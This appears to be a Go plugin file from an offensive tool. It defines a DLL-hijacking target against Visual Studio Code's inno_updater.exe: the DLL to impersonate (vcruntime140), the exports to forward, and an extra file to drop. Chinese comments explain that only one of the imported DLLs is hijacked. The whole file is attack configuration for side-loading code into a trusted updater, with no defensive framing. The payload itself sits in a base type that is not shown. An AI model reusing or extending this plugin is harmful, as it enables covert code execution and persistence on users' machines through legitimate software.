package plugins

// PreloadDllHijackVscode 位于 vscode 安装目录的 tools/inno_updater.exe
type PreloadDllHijackVscode struct {
	SubPluginPreloadDllHijackX86
}

func (p *PreloadDllHijackVscode) GetMainProgramName() (string) {
	return "inno_updater"
}

func (p *PreloadDllHijackVscode) GetDllName() (string) {
	return "vcruntime140"
}

func (p *PreloadDllHijackVscode) GetPluginName() (string) {
	return "preload_dll_hijack_vscode"
}

func (p *PreloadDllHijackVscode) GetDllExports() []string {
	return []string{
		"_except_handler4_common",
		"memset",
		"memmove",
		"memcmp",
		"memcpy",
		"__std_type_info_destroy_list",
	}
}

// GetExtraFileList 获取额外的文件列表，某些情况下exe可能导入的dll不止一个，但我们只对其中一个进行劫持，其他的dll在该列表中体现
func (p *PreloadDllHijackVscode) GetExtraFileList() ([]string) {
	return []string{
		"libgcc_s_dw2-1.dll",
	}
}